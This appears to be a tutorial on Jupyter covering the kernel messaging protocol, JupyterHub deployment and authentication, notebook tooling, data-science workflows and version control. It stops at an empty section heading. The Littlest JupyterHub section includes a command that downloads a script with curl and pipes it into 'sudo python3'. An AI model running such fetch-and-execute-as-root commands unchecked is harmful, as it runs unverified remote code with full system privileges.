# Jupyter Notebooks and Computational Notebooks for Data Science

## Indice

1. [Jupyter Architecture](#1-jupyter-architecture)
2. [JupyterHub Deployment](#2-jupyterhub-deployment)
3. [Advanced Usage](#3-advanced-usage)
4. [Data Science Workflow](#4-data-science-workflow)
5. [Collaboration](#5-collaboration)
6. [Production Patterns](#6-production-patterns)
7. [Security Risks](#7-security-risks)
8. [JupyterHub Hardening](#8-jupyterhub-hardening)
9. [Alternative Platforms](#9-alternative-platforms)
10. [Lab Exercises](#10-lab-exercises)

---

## 1. Jupyter Architecture

### 1.1 Historical Context and Design Philosophy

Project Jupyter evolved from IPython (Interactive Python) in 2014, adopting the name as an acronym for Julia, Python, and R — the three original target languages. The architectural decision to decouple the execution engine (kernel) from the user interface defined the project's extensibility. This separation follows a classical client-server model where the notebook interface acts as a thin client communicating with a language-agnostic execution backend.

The fundamental design principle is language independence through protocol standardization. Any programming language that can implement the Jupyter messaging protocol becomes a first-class citizen in the ecosystem, enabling polyglot data science workflows within a single environment.

### 1.2 The Kernel Protocol (ZeroMQ)

The Jupyter kernel protocol uses ZeroMQ (ZMQ) as its messaging transport layer. ZMQ provides asynchronous, brokerless messaging with multiple socket patterns suited to the interactive computing model.

**Socket Architecture:**

```
+-------------------+         +-------------------+
|   Notebook Client |         |      Kernel       |
|                   |         |                   |
|  Shell (DEALER) --+-------->+-- Shell (ROUTER)  |
|  IOPub (SUB)   ---+-------->+-- IOPub (PUB)     |
|  Stdin (DEALER) --+-------->+-- Stdin (ROUTER)  |
|  Control(DEALER)--+-------->+-- Control(ROUTER) |
|  HB (REQ)      ---+-------->+-- HB (REP)        |
+-------------------+         +-------------------+
```

**Five communication channels:**

| Channel | Socket Pattern | Purpose |
|---------|---------------|---------|
| Shell | ROUTER/DEALER | Execute requests, inspect, complete, history |
| IOPub | PUB/SUB | Broadcast outputs, status, errors to all clients |
| Stdin | ROUTER/DEALER | Raw input requests (e.g., `input()` calls) |
| Control | ROUTER/DEALER | Shutdown, interrupt, debug — bypasses shell queue |
| Heartbeat | REP/REQ | Kernel liveness detection via echo |

**Message Format (Wire Protocol):**

```
[                          # ZMQ multipart message
  b'<IDS|MSG>',           # Delimiter
  HMAC_signature,         # SHA-256 HMAC of header+parent+metadata+content
  header,                 # JSON: msg_id, session, username, date, msg_type, version
  parent_header,          # Header of the request that triggered this message
  metadata,              # JSON: engine-specific metadata
  content,               # JSON: message-type-specific payload
  buffers               # Raw binary data (e.g., numpy arrays)
]
```

The HMAC signature uses a shared key established at kernel startup, providing message authentication between the frontend and kernel. This prevents unauthorized message injection on the ZMQ sockets.

**Execution Model:**

1. Client sends `execute_request` on Shell channel
2. Kernel publishes `status: busy` on IOPub
3. Kernel executes code, publishes intermediate outputs on IOPub (`stream`, `display_data`, `execute_result`)
4. Kernel sends `execute_reply` on Shell (success/error)
5. Kernel publishes `status: idle` on IOPub

The Shell channel processes requests sequentially (FIFO queue), while the Control channel can interrupt ongoing execution — this is how `Kernel → Interrupt` works.

### 1.3 Notebook Server Architecture

The classic Jupyter Notebook server is a Tornado-based web application providing:

- **REST API** — CRUD operations on notebooks, kernels, terminals, sessions
- **WebSocket endpoints** — Real-time kernel communication relay
- **Static file serving** — JavaScript frontend assets
- **Contents API** — File system abstraction (local FS, S3, GCS via ContentsManager)

```
Browser (JS Client)
    |
    |--- HTTP REST (notebook CRUD, kernel management)
    |--- WebSocket (kernel messages relay)
    |
Tornado Server (jupyter_server)
    |
    |--- KernelManager (lifecycle: start, stop, restart, interrupt)
    |--- SessionManager (notebook ↔ kernel mapping)
    |--- ContentsManager (file I/O abstraction)
    |
    +--- ZMQ ↔ Kernel Process(es)
```

The server translates WebSocket frames into ZMQ messages and vice versa, acting as a bridge between the browser-based frontend and the kernel processes.

### 1.4 JupyterLab (Next-Generation UI)

JupyterLab replaced the classic Notebook interface as the default frontend in Jupyter 4.0. Key architectural differences:

- **Extension system** — Plugin-based architecture using `@jupyterlab/application` framework. Extensions are TypeScript packages loaded at runtime.
- **Document model** — Abstract document handling allowing multiple views of the same file (split editors, linked outputs).
- **Phosphor/Lumino widgets** — Layout engine providing docking panels, tabs, drag-and-drop.
- **MIME rendering** — Extensible output rendering pipeline supporting custom MIME types.
- **LSP integration** — Language Server Protocol support for autocomplete, diagnostics, hover documentation.
- **Real-Time Collaboration** — Built-in support via Yjs CRDT for multi-user editing (JupyterLab >= 3.1).

The extension architecture uses a dependency injection pattern where each plugin declares its requirements (`requires`) and provided services (`provides`), enabling compile-time verification of extension compatibility.

### 1.5 Kernel Types

**IPython Kernel (Python):**
The reference implementation. Provides rich display (HTML, SVG, LaTeX), magic commands, tab completion via Jedi/Parso, and object introspection. Execution uses a single-threaded event loop with `asyncio` integration.

**IRkernel (R):**
R kernel communicating via the `IRkernel` package. Supports R's native plotting devices with automatic PNG/SVG capture. Integrates with R's `repr` system for rich output.

**IJulia (Julia):**
Julia kernel using the `IJulia.jl` package. Leverages Julia's native display system and supports inline plotting via Plots.jl/Makie.jl.

**Other Notable Kernels:**

| Kernel | Language | Key Feature |
|--------|----------|-------------|
| xeus-cling | C++ | LLVM-based C++ interpreter |
| IElixir | Elixir | BEAM VM integration |
| IRust (evcxr) | Rust | Incremental compilation |
| Ganymede | Java | JShell-based |
| SoS | Multi-language | Polyglot kernel, variable sharing |
| Wolfram | Mathematica | Wolfram Language |

### 1.6 Notebook Format (nbformat)

Notebooks are JSON documents following the nbformat specification (currently v4.5):

```json
{
  "metadata": {
    "kernelspec": {
      "name": "python3",
      "display_name": "Python 3",
      "language": "python"
    },
    "language_info": {
      "name": "python",
      "version": "3.11.0",
      "mimetype": "text/x-python",
      "file_extension": ".py"
    }
  },
  "nbformat": 4,
  "nbformat_minor": 5,
  "cells": [
    {
      "cell_type": "markdown",
      "id": "abc123",
      "metadata": {},
      "source": ["# Title\n", "Description text"]
    },
    {
      "cell_type": "code",
      "id": "def456",
      "metadata": {
        "execution": {"iopub.status.busy": "2024-01-15T10:30:00.000Z"}
      },
      "source": ["import pandas as pd\n", "df = pd.read_csv('data.csv')"],
      "execution_count": 1,
      "outputs": [
        {
          "output_type": "execute_result",
          "data": {"text/plain": "DataFrame(100, 5)"},
          "metadata": {},
          "execution_count": 1
        }
      ]
    },
    {
      "cell_type": "raw",
      "id": "ghi789",
      "metadata": {"format": "text/restructuredtext"},
      "source": [".. note::\n", "   Raw cells pass through nbconvert unchanged"]
    }
  ]
}
```

**Cell Types:**

- `code` — Executable source with associated outputs and execution count
- `markdown` — Rendered Markdown with LaTeX math support (`$...$`, `$$...$$`)
- `raw` — Unprocessed content for nbconvert format-specific directives

**Design Implications:**

The JSON format means notebooks are technically text files but practically binary for version control purposes. Cell outputs (especially images as base64) create large diffs, merge conflicts on execution counts are inevitable, and the non-deterministic key ordering in metadata makes clean diffs nearly impossible without tooling.

### 1.7 Execution Model Details

Jupyter uses an execute-display model:

1. **Implicit last expression** — The last expression in a cell is automatically displayed (like a REPL), unless suppressed with `;`
2. **Shared namespace** — All cells in a notebook share a single kernel namespace. Variable state persists across cells regardless of cell order in the document.
3. **Non-linear execution** — Users can execute cells in any order, creating hidden state dependencies. The execution count tracks actual execution order.
4. **Display protocol** — Objects implement `_repr_html_()`, `_repr_latex_()`, `_repr_png_()` etc. The richest representation the frontend supports is rendered.
5. **Comm protocol** — Bidirectional stateful communication channel between kernel and frontend, used by ipywidgets for interactive elements.

---

## 2. JupyterHub Deployment

### 2.1 Architecture Overview

JupyterHub is a multi-user Jupyter server that manages authentication, spawning, and proxying of individual user notebook servers.

```
                    +------------------+
                    |   HTTP Proxy     |
                    | (configurable-   |
                    |  http-proxy)     |
                    +--------+---------+
                             |
              +--------------+--------------+
              |                             |
    +---------v---------+     +-------------v-----------+
    |    JupyterHub     |     |  User Notebook Servers  |
    |    (Hub process)  |     |  /user/alice/           |
    |                   |     |  /user/bob/             |
    |  - Authenticator  |     |  /user/carol/           |
    |  - Spawner        |     +-----------+-------------+
    |  - Database       |                 |
    +-------------------+                 |
                                    +-----v------+
                                    |   Kernels  |
                                    +------------+
```

**Core Components:**

- **Hub** — Central process handling authentication, user database (SQLite/PostgreSQL), and spawn orchestration
- **Proxy** — Routes requests to individual user servers. Default: `configurable-http-proxy` (Node.js). Alternative: `traefik-proxy`
- **Spawner** — Creates isolated user server processes
- **Authenticator** — Validates user credentials

### 2.2 Spawners

**LocalProcessSpawner:**

Simplest spawner. Launches notebook servers as local OS processes under the user's system account. Suitable for single-machine deployments with trusted users.

```python
c.JupyterHub.spawner_class = 'jupyterhub.spawner.LocalProcessSpawner'
c.Spawner.notebook_dir = '/home/{username}/notebooks'
c.Spawner.default_url = '/lab'
```

Limitations: No resource isolation, requires system accounts for each user, no horizontal scaling.

**DockerSpawner:**

Each user gets an isolated Docker container:

```python
c.JupyterHub.spawner_class = 'dockerspawner.DockerSpawner'
c.DockerSpawner.image = 'jupyter/scipy-notebook:latest'
c.DockerSpawner.network_name = 'jupyterhub-network'
c.DockerSpawner.volumes = {
    'jupyterhub-user-{username}': '/home/jovyan/work',
    '/shared/datasets': {'bind': '/datasets', 'mode': 'ro'}
}
c.DockerSpawner.mem_limit = '4G'
c.DockerSpawner.cpu_limit = 2.0
c.DockerSpawner.remove = True  # Remove container on stop
```

Benefits: Resource limits via cgroup, filesystem isolation, reproducible environments, easy image updates.

**KubeSpawner:**

Production-grade spawner for Kubernetes clusters:

```python
c.JupyterHub.spawner_class = 'kubespawner.KubeSpawner'
c.KubeSpawner.image = 'registry.internal/jupyter-env:v2.1'
c.KubeSpawner.cpu_limit = 4
c.KubeSpawner.cpu_guarantee = 0.5
c.KubeSpawner.mem_limit = '8G'
c.KubeSpawner.mem_guarantee = '1G'
c.KubeSpawner.storage_class = 'standard'
c.KubeSpawner.storage_capacity = '10Gi'
c.KubeSpawner.profile_list = [
    {
        'display_name': 'Data Science (Small)',
        'kubespawner_override': {
            'image': 'registry.internal/jupyter-ds:latest',
            'cpu_limit': 2, 'mem_limit': '4G'
        }
    },
    {
        'display_name': 'GPU Workload',
        'kubespawner_override': {
            'image': 'registry.internal/jupyter-gpu:latest',
            'cpu_limit': 8, 'mem_limit': '32G',
            'extra_resource_limits': {'nvidia.com/gpu': '1'}
        }
    }
]
```

**SystemdSpawner:**

Uses systemd to manage user servers as transient units. Provides cgroup-based resource limits without containers:

```python
c.JupyterHub.spawner_class = 'systemdspawner.SystemdSpawner'
c.SystemdSpawner.mem_limit = '4G'
c.SystemdSpawner.cpu_limit = 200  # 200% = 2 cores
c.SystemdSpawner.isolate_tmp = True
c.SystemdSpawner.isolate_devices = True
```

### 2.3 Authenticators

**PAM Authenticator (default):**
Uses Linux PAM — authenticates against system users. Simple but requires local accounts.

**OAuthenticator (OAuth 2.0/OIDC):**

```python
c.JupyterHub.authenticator_class = 'oauthenticator.github.GitHubOAuthenticator'
c.GitHubOAuthenticator.oauth_callback_url = 'https://jupyter.example.com/hub/oauth_callback'
c.GitHubOAuthenticator.client_id = os.environ['GITHUB_CLIENT_ID']
c.GitHubOAuthenticator.client_secret = os.environ['GITHUB_CLIENT_SECRET']
c.GitHubOAuthenticator.allowed_organizations = {'myorg'}
c.GitHubOAuthenticator.scope = ['read:org']
```

Supported providers: GitHub, Google, Azure AD, GitLab, Auth0, Keycloak (generic OIDC), CILogon.

**LDAPAuthenticator:**

```python
c.JupyterHub.authenticator_class = 'ldapauthenticator.LDAPAuthenticator'
c.LDAPAuthenticator.server_address = 'ldap.corp.example.com'
c.LDAPAuthenticator.server_port = 636
c.LDAPAuthenticator.use_ssl = True
c.LDAPAuthenticator.bind_dn_template = ['uid={username},ou=people,dc=example,dc=com']
c.LDAPAuthenticator.allowed_groups = ['cn=data-team,ou=groups,dc=example,dc=com']
```

**NativeAuthenticator:**
Built-in username/password with signup. Stores bcrypt hashes in Hub database. Suitable for workshops, training sessions.

### 2.4 Zero to JupyterHub on Kubernetes (z2jh)

The official Helm chart for deploying JupyterHub on Kubernetes:

```bash
helm repo add jupyterhub https://hub.jupyter.org/helm-chart/
helm repo update

helm upgrade --install jhub jupyterhub/jupyterhub \
  --namespace jhub \
  --create-namespace \
  --version 3.2.1 \
  --values config.yaml
```

Minimal `config.yaml`:

```yaml
proxy:
  https:
    enabled: true
    type: letsencrypt
    letsencrypt:
      contactEmail: admin@example.com
  service:
    type: LoadBalancer

singleuser:
  image:
    name: jupyter/scipy-notebook
    tag: "2024-01-15"
  storage:
    dynamic:
      storageClass: standard
      capacity: 10Gi
  memory:
    limit: 4G
    guarantee: 1G
  cpu:
    limit: 2
    guarantee: 0.5

hub:
  config:
    Authenticator:
      admin_users:
        - admin@example.com
    GitHubOAuthenticator:
      client_id: "<id>"
      client_secret: "<secret>"
      oauth_callback_url: "https://jupyter.example.com/hub/oauth_callback"
      allowed_organizations:
        - my-org
    JupyterHub:
      authenticator_class: github

scheduling:
  userScheduler:
    enabled: true
  podPriority:
    enabled: true

cull:
  enabled: true
  timeout: 3600      # 1 hour idle
  every: 300         # Check every 5 minutes
  maxAge: 28800      # 8 hours maximum
```

### 2.5 The Littlest JupyterHub (TLJH)

Single-server deployment for 1–100 users. Installs with a single command:

```bash
curl -L https://tljh.jupyter.org/bootstrap.py | sudo python3 - \
  --admin admin-user \
  --plugin tljh-placements
```

TLJH uses systemd-based spawning, conda for environment management, and traefik for HTTPS. Configuration lives in `/opt/tljh/config/`:

```yaml
# /opt/tljh/config/jupyterhub_config.d/resource_limits.py
c.Spawner.mem_limit = '2G'
c.Spawner.cpu_limit = 1.0
```

### 2.6 Admin Features and User Management

JupyterHub provides admin capabilities:

- **Admin panel** — Start/stop user servers, impersonate users
- **Named servers** — Multiple server instances per user (different environments)
- **Services** — Long-running processes with Hub API access (shared dashboards, cron jobs)
- **Groups** — Logical groupings for access control
- **Token management** — API tokens for programmatic access with scoped permissions

```python
c.JupyterHub.load_roles = [
    {
        "name": "instructor",
        "scopes": ["admin:servers", "access:servers", "list:users"],
        "groups": ["instructors"]
    },
    {
        "name": "student",
        "scopes": ["access:servers!user", "self"],
        "groups": ["students"]
    }
]
```

---

## 3. Advanced Usage

### 3.1 Magic Commands

IPython magic commands extend the notebook with meta-programming capabilities:

**Line Magics (single `%`):**

```python
%timeit sum(range(10000))          # Micro-benchmark with statistical analysis
%who int                            # List variables of type int
%prun my_function()                 # Profile function (cProfile)
%lprun -f func func(args)          # Line profiler (requires line_profiler)
%memit heavy_function()            # Memory usage (requires memory_profiler)
%env MY_VAR=value                   # Set environment variable
%load script.py                     # Load file content into cell
%run analysis.py                    # Execute script in kernel namespace
%store variable                     # Persist variable across sessions
%matplotlib inline                  # Configure matplotlib backend
%autoreload 2                       # Auto-reload modules on change
%debug                              # Post-mortem debugger
```

**Cell Magics (double `%%`):**

```python
%%timeit
# Benchmark entire cell
result = [x**2 for x in range(10000)]
```

```python
%%sql
SELECT customer_id, SUM(amount)
FROM transactions
WHERE date > '2024-01-01'
GROUP BY customer_id
HAVING SUM(amount) > 1000
ORDER BY SUM(amount) DESC
LIMIT 20
```

```python
%%writefile config.yaml
database:
  host: localhost
  port: 5432
```

```python
%%capture output
# Capture all stdout/stderr into variable
print("This goes into output.stdout")
```

```python
%%bash
find /data -name "*.parquet" -mtime -7 | wc -l
```

```python
%%html
<div style="background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            padding: 2rem; border-radius: 8px; color: white;">
  <h2>Interactive Dashboard Header</h2>
</div>
```

### 3.2 IPython Extensions

```python
%load_ext autoreload
%autoreload 2              # Reload all modules before executing

%load_ext sql              # SQL magic for database queries
%sql sqlite:///mydb.db

%load_ext watermark
%watermark -v -p numpy,pandas,sklearn  # Print version info

%load_ext line_profiler    # Detailed line-by-line profiling
%load_ext memory_profiler  # Memory usage tracking
```

### 3.3 Interactive Widgets (ipywidgets)

```python
import ipywidgets as widgets
from IPython.display import display

# Basic slider with callback
slider = widgets.FloatSlider(
    value=0.5, min=0, max=1, step=0.01,
    description='Threshold:',
    continuous_update=False
)

output = widgets.Output()

def on_change(change):
    with output:
        output.clear_output()
        filtered = df[df['score'] > change['new']]
        print(f"Rows above threshold: {len(filtered)}")

slider.observe(on_change, names='value')
display(widgets.VBox([slider, output]))
```

```python
# Interactive function exploration
from ipywidgets import interact, fixed

@interact(
    n_clusters=(2, 20, 1),
    algorithm=['k-means', 'dbscan', 'hierarchical'],
    normalize=True
)
def explore_clustering(n_clusters=5, algorithm='k-means', normalize=True):
    # Visualization updates automatically
    run_clustering(data, n_clusters, algorithm, normalize)
```

**Advanced Widget Patterns:**

```python
# Dashboard layout
tab = widgets.Tab()
tab.children = [
    widgets.VBox([chart1, controls1]),
    widgets.VBox([chart2, controls2]),
    widgets.VBox([metrics_table])
]
tab.set_title(0, 'Exploration')
tab.set_title(1, 'Modeling')
tab.set_title(2, 'Metrics')
display(tab)
```

### 3.4 nbconvert: Format Conversion

nbconvert transforms notebooks into various output formats:

```bash
# HTML report (self-contained)
jupyter nbconvert --to html --no-input analysis.ipynb

# PDF via LaTeX
jupyter nbconvert --to pdf --template report analysis.ipynb

# Reveal.js slides
jupyter nbconvert --to slides presentation.ipynb --post serve

# Python script (strip markdown, outputs)
jupyter nbconvert --to script notebook.ipynb

# Markdown (for documentation)
jupyter nbconvert --to markdown --output-dir docs/ notebook.ipynb

# Execute then convert (fresh run)
jupyter nbconvert --to html --execute --ExecutePreprocessor.timeout=600 notebook.ipynb
```

**Custom Templates (Jinja2):**

```bash
jupyter nbconvert --to html --template custom_report analysis.ipynb
```

Template directory structure:
```
custom_report/
├── conf.json
├── index.html.j2
└── static/
    └── styles.css
```

### 3.5 Papermill: Parameterized Execution

Papermill enables treating notebooks as parameterized functions:

```python
import papermill as pm

# Execute with parameters
pm.execute_notebook(
    'template_analysis.ipynb',        # Input notebook
    'output/analysis_2024_Q1.ipynb',  # Output notebook
    parameters={
        'start_date': '2024-01-01',
        'end_date': '2024-03-31',
        'region': 'EU',
        'threshold': 0.85
    },
    kernel_name='python3',
    cwd='/project/notebooks'
)
```

In the template notebook, mark the parameters cell with a `parameters` tag:

```python
# Parameters (tagged cell)
start_date = '2024-01-01'
end_date = '2024-12-31'
region = 'US'
threshold = 0.9
```

Papermill injects a new cell after the parameters cell with the overridden values, preserving the notebook as a self-documenting execution record.

**Batch Execution:**

```python
import papermill as pm
from concurrent.futures import ProcessPoolExecutor

configs = [
    {'region': 'US', 'model': 'xgboost'},
    {'region': 'EU', 'model': 'lightgbm'},
    {'region': 'APAC', 'model': 'catboost'},
]

def run_analysis(config):
    pm.execute_notebook(
        'model_training.ipynb',
        f'output/training_{config["region"]}_{config["model"]}.ipynb',
        parameters=config
    )

with ProcessPoolExecutor(max_workers=3) as executor:
    executor.map(run_analysis, configs)
```

### 3.6 JupyterLab Extensions

**Essential Extensions:**

| Extension | Purpose |
|-----------|---------|
| `@jupyterlab/toc` | Table of contents from markdown headings |
| `jupyterlab-variableinspector` | Variable explorer pane |
| `jupyterlab-code-formatter` | Black/autopep8/isort integration |
| `jupyterlab-lsp` | Language Server Protocol (autocomplete, diagnostics) |
| `jupyterlab-git` | Git GUI integration |
| `jupyterlab-execute-time` | Cell execution time display |
| `jupyterlab-system-monitor` | CPU/RAM usage in status bar |
| `jupyterlab-drawio` | Diagram editor |

**Installing Extensions:**

```bash
# pip-based (modern approach, JupyterLab 3+)
pip install jupyterlab-git jupyterlab-lsp python-lsp-server

# Verify
jupyter labextension list
```

### 3.7 Custom Kernels

Creating a minimal kernel requires implementing the kernel protocol. Using the `ipykernel` base:

```python
from ipykernel.kernelbase import Kernel

class EchoKernel(Kernel):
    implementation = 'Echo'
    implementation_version = '1.0'
    language = 'text'
    language_version = '1.0'
    language_info = {
        'name': 'text',
        'mimetype': 'text/plain',
        'file_extension': '.txt',
    }
    banner = "Echo Kernel - echoes input"

    def do_execute(self, code, silent, store_history=True,
                   user_expressions=None, allow_stdin=False):
        if not silent:
            self.send_response(
                self.iopub_socket, 'stream',
                {'name': 'stdout', 'text': f'Echo: {code}\n'}
            )
        return {
            'status': 'ok',
            'execution_count': self.execution_count,
            'payload': [],
            'user_expressions': {},
        }

if __name__ == '__main__':
    from ipykernel.kernelapp import IPKernelApp
    IPKernelApp.launch_instance(kernel_class=EchoKernel)
```

Register with:
```json
{
  "argv": ["python", "-m", "echo_kernel", "-f", "{connection_file}"],
  "display_name": "Echo",
  "language": "text"
}
```

---

## 4. Data Science Workflow

### 4.1 Exploratory Data Analysis (EDA) in Notebooks

Notebooks excel at EDA due to the interleaving of code, output, and narrative. A structured EDA workflow:

```python
import pandas as pd
import numpy as np

# 1. Data Loading and Initial Inspection
df = pd.read_parquet('transactions_2024.parquet')

print(f"Shape: {df.shape}")
print(f"Memory: {df.memory_usage(deep=True).sum() / 1e6:.1f} MB")
print(f"Duplicates: {df.duplicated().sum()}")
print(f"Date range: {df['timestamp'].min()} to {df['timestamp'].max()}")

df.dtypes
df.describe(include='all')
df.isnull().sum().sort_values(ascending=False).head(20)
```

```python
# 2. Distribution Analysis
import matplotlib.pyplot as plt
import seaborn as sns

fig, axes = plt.subplots(2, 3, figsize=(15, 10))

for idx, col in enumerate(numeric_cols[:6]):
    ax = axes[idx // 3, idx % 3]
    sns.histplot(df[col], ax=ax, kde=True)
    ax.axvline(df[col].median(), color='red', linestyle='--', label='median')
    ax.set_title(f'{col} (skew={df[col].skew():.2f})')
    ax.legend()

plt.tight_layout()
plt.show()
```

```python
# 3. Correlation and Relationships
correlation_matrix = df[numeric_cols].corr()

mask = np.triu(np.ones_like(correlation_matrix, dtype=bool))
fig, ax = plt.subplots(figsize=(12, 10))
sns.heatmap(correlation_matrix, mask=mask, annot=True, fmt='.2f',
            cmap='RdBu_r', center=0, ax=ax)
plt.title('Feature Correlations')
plt.show()

# Identify highly correlated pairs
high_corr = (correlation_matrix.abs()
             .unstack()
             .sort_values(ascending=False)
             .drop_duplicates())
high_corr[(high_corr > 0.8) & (high_corr < 1.0)]
```

### 4.2 Visualization Integration

**Matplotlib Inline Configuration:**

```python
%matplotlib inline
%config InlineBackend.figure_format = 'retina'  # High-DPI
plt.rcParams['figure.figsize'] = (12, 6)
plt.rcParams['font.size'] = 11
```

**Plotly for Interactive Visualization:**

```python
import plotly.express as px
import plotly.graph_objects as go
from plotly.subplots import make_subplots

fig = make_subplots(
    rows=2, cols=2,
    subplot_titles=('Revenue by Region', 'Monthly Trend',
                    'Category Distribution', 'Anomaly Detection'),
    specs=[[{'type': 'bar'}, {'type': 'scatter'}],
           [{'type': 'pie'}, {'type': 'scatter'}]]
)

# Interactive — zoom, hover, filter in notebook
fig.update_layout(height=800, showlegend=True)
fig.show()
```

**Bokeh for Server-Side Interactivity:**

```python
from bokeh.plotting import figure, show
from bokeh.io import output_notebook
from bokeh.models import HoverTool, ColumnDataSource

output_notebook()

source = ColumnDataSource(df)
p = figure(width=800, height=400, title='Time Series',
           x_axis_type='datetime', tools='pan,wheel_zoom,box_zoom,reset')

p.line('timestamp', 'value', source=source, line_width=2)
p.add_tools(HoverTool(tooltips=[
    ('Date', '@timestamp{%F}'),
    ('Value', '@value{0.2f}')
], formatters={'@timestamp': 'datetime'}))

show(p)
```

### 4.3 Big Data Integration

**PySpark with Notebooks:**

```python
from pyspark.sql import SparkSession

spark = (SparkSession.builder
    .appName("NotebookAnalysis")
    .config("spark.sql.adaptive.enabled", "true")
    .config("spark.driver.memory", "4g")
    .config("spark.executor.memory", "8g")
    .config("spark.ui.showConsoleProgress", "true")
    .getOrCreate())

# Spark DataFrame operations
events = spark.read.parquet("s3a://datalake/events/2024/")
events.createOrReplaceTempView("events")

# Use Spark SQL magic
%%sql
SELECT event_type, COUNT(*) as count,
       AVG(duration_ms) as avg_duration
FROM events
WHERE date >= '2024-01-01'
GROUP BY event_type
ORDER BY count DESC
```

**Dask for Out-of-Core Computation:**

```python
import dask.dataframe as dd
from dask.distributed import Client

client = Client('scheduler:8786')  # Connect to Dask cluster
client  # Displays dashboard link in notebook

# Dask reads partitioned data lazily
ddf = dd.read_parquet('s3://bucket/data/', columns=['user_id', 'amount', 'ts'])

# Familiar pandas-like API
result = (ddf
    .groupby('user_id')
    .agg({'amount': ['sum', 'mean', 'count']})
    .compute())  # Trigger distributed computation
```

### 4.4 Database Connectivity

**SQL Magic with SQLAlchemy:**

```python
%load_ext sql
%sql postgresql://analyst:${DB_PASS}@warehouse:5432/analytics

%%sql result <<
WITH monthly_metrics AS (
    SELECT
        date_trunc('month', created_at) AS month,
        COUNT(DISTINCT user_id) AS mau,
        SUM(revenue) AS total_revenue
    FROM events
    WHERE created_at >= '2024-01-01'
    GROUP BY 1
)
SELECT
    month,
    mau,
    total_revenue,
    total_revenue / NULLIF(mau, 0) AS arpu,
    LAG(mau) OVER (ORDER BY month) AS prev_mau,
    (mau - LAG(mau) OVER (ORDER BY month))::float /
        NULLIF(LAG(mau) OVER (ORDER BY month), 0) * 100 AS mau_growth_pct
FROM monthly_metrics
ORDER BY month
```

```python
# Result is a pandas DataFrame
result_df = result.DataFrame()
result_df.plot(x='month', y=['mau', 'total_revenue'], secondary_y='total_revenue')
```

**Direct SQLAlchemy for Complex Workflows:**

```python
from sqlalchemy import create_engine, text
import pandas as pd

engine = create_engine(
    'postgresql://analyst@warehouse:5432/analytics',
    connect_args={'options': '-c statement_timeout=300000'}
)

# Chunked reading for large results
chunks = pd.read_sql(
    "SELECT * FROM large_table WHERE partition_date = '2024-01-15'",
    engine,
    chunksize=100_000
)

processed = pd.concat([transform(chunk) for chunk in chunks])
```

### 4.5 API Exploration and Rapid Prototyping

Notebooks serve as ideal environments for API exploration:

```python
import httpx
from IPython.display import JSON

client = httpx.Client(
    base_url='https://api.example.com/v2',
    headers={'Authorization': f'Bearer {os.environ["API_TOKEN"]}'},
    timeout=30.0
)

# Explore endpoint
response = client.get('/users', params={'limit': 5, 'include': 'metrics'})
response.raise_for_status()

# Rich JSON display in notebook
JSON(response.json())
```

```python
# Rapid prototyping pattern: iterate on transformations
def transform_pipeline(raw_data):
    """Prototype transformation — will move to production module."""
    df = pd.json_normalize(raw_data, record_path='events',
                           meta=['user_id', 'session_id'])
    df['timestamp'] = pd.to_datetime(df['timestamp'], utc=True)
    df['hour'] = df['timestamp'].dt.hour
    df['is_business_hours'] = df['hour'].between(9, 17)
    return df

# Test with sample
sample = transform_pipeline(response.json()['data'][:10])
sample.head()
```

---

## 5. Collaboration

### 5.1 Version Control Challenges

Notebooks present unique version control challenges:

1. **Outputs inflate diffs** — Base64-encoded images, HTML tables, and widget state produce massive diffs unrelated to code changes
2. **Execution counts change** — Running cells increments `execution_count`, creating noise
3. **Non-deterministic metadata** — Cell IDs, timestamps, kernel info change unpredictably
4. **Merge conflicts** — JSON structure makes manual conflict resolution painful
5. **Secrets in outputs** — Database connection strings, API keys, tokens accidentally saved in output cells

### 5.2 nbstripout: Clean Notebooks Before Commit

```bash
pip install nbstripout
nbstripout --install  # Install as git filter

# .gitattributes (commit this)
*.ipynb filter=nbstripout
*.ipynb diff=ipynb
```

Configuration in `.nbstripout`:
```ini
[nbstripout]
keep_output = false
keep_count = false
extra_keys = "metadata.kernelspec metadata.language_info.version cell.metadata.pycharm"
```

This ensures committed notebooks never contain outputs, reducing diff noise by 90%+ and preventing accidental secret leakage.

### 5.3 Jupytext: Notebooks as Scripts

Jupytext pairs notebooks with plain text representations:

```bash
pip install jupytext

# Convert notebook to paired Python percent format
jupytext --set-formats ipynb,py:percent notebook.ipynb
```

The `.py` file uses `# %%` markers (compatible with VS Code, PyCharm, Spyder):

```python
# %% [markdown]
# # Analysis Title
# This notebook analyzes quarterly metrics.

# %%
import pandas as pd
import matplotlib.pyplot as plt

# %% tags=["parameters"]
quarter = "2024-Q1"
region = "EU"

# %%
df = pd.read_parquet(f"data/{quarter}_{region}.parquet")
df.describe()
```

**Git workflow with Jupytext:**

```ini
# .gitignore
*.ipynb  # Only track .py versions

# jupytext.toml
formats = "ipynb,py:percent"
notebook_metadata_filter = "-all"
cell_metadata_filter = "tags,-all"
```

Developers edit `.py` files (clean diffs, standard merge tools), while Jupytext syncs the `.ipynb` for execution.

### 5.4 ReviewNB

ReviewNB provides GitHub-native notebook diff and review:

- Renders cell-level diffs with rich output comparison
- Inline commenting on specific cells
- CI integration (can block PRs with failing notebooks)
- Visual comparison of plots between versions

### 5.5 Real-Time Collaboration (JupyterLab RTC)

JupyterLab 3.1+ includes built-in real-time collaboration using Yjs CRDT (Conflict-free Replicated Data Types):

```bash
# Enable RTC
pip install jupyter-collaboration

# Configure
jupyter lab --collaborative
```

Architecture: A Yjs document represents the notebook state. Multiple clients sync via WebSocket through a shared Yjs room. Changes merge automatically without conflict — similar to Google Docs.

Limitations: All collaborators must connect to the same JupyterLab server instance. The kernel is shared, so execution state is global.

### 5.6 Sharing Platforms

**nbviewer:**
Static rendering service. Point it at any public notebook URL:
```
https://nbviewer.org/github/user/repo/blob/main/analysis.ipynb
```

**Binder (mybinder.org):**
Launches a live, reproducible notebook environment from a Git repository:
```
https://mybinder.org/v2/gh/user/repo/main?labpath=notebook.ipynb
```

Requires `environment.yml`, `requirements.txt`, or `Dockerfile` in the repo. Free tier has limited resources (1-2GB RAM, 10 min idle timeout).

**Google Colab:**
Hosted notebooks with free GPU access. Directly opens GitHub notebooks:
```
https://colab.research.google.com/github/user/repo/blob/main/notebook.ipynb
```

### 5.7 Documentation Notebooks

Best practices for documentation notebooks:

1. **Narrative flow** — Markdown cells explain the "why" before code shows the "how"
2. **Reproducibility header** — First cell installs dependencies and prints versions
3. **Data provenance** — Document data sources, access dates, transformations
4. **Progressive complexity** — Start simple, layer sophistication
5. **Clean outputs** — If committing with outputs, ensure they are deterministic and informative

---

## 6. Production Patterns

